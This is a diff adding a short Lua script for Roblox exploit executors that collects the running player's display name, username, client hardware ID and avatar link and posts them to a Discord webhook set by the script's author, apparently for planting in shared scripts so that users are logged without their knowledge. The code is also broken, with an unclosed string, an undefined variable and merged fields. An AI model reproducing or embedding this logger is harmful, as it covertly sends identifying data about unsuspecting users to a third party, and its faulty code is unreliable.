@@ -1,0 +1,33 @@
+local Webhook_URL = "Your webhook" -- Made By Raiwesy Come to Discord :D
+local Headers = {
+    ['Content-Type'] = 'application/json',
+}
+
+local data = {
+    ["embeds"] = {
+        {
+            ["title"] = "Player Executed Your Script - @Raiwesy",
+            ["description"] = game.Players.LocalPlayer.DisplayName .. " :UserName: "..  game.Players.LocalPlayer.Name,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = "Player HWID :",
+                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                    ["inline"] = true,
+
+ 		    ["name"] = "Player Avatar :",
+                    ["value"] = https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png,
+                    ["inline"] = true,
+
+                },
+	   ["footer"] = "Made By Raiwesy",
+            },
+        },
+    },
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(data)
+
+local Request = http_request or request or HttpPost or syn.request
+Request({Url = Webhook_URL, Body = PlayerData, Method = "POST", Headers = Headers})
